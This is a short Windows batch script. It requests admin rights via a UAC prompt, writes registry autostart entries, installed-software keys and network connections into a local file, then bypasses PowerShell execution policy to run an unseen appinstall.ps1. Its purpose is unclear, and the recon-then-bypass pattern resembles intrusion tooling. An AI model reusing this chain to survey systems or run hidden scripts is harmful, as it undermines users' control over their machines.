@echo off
REM

@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:""=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
	dir /s appinstall.ps1 > comp.txt
	reg query HKLM\Software\microsoft\windows\currentversion\run >> comp.txt
	reg query HKLM\software\ >> comp.txt
	echo "Dont Worry... We took care of things. :)" >> comp.txt
	reg	query HKCU\Software\Python
	netstat -fnop TCP >> comp.txt
    powershell.exe Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Function auth { $global:getstuff = cmd.exe /c "dir /s /b appinstall.ps1" }; auth; $global:getstuff; powershell.exe $global:getstuff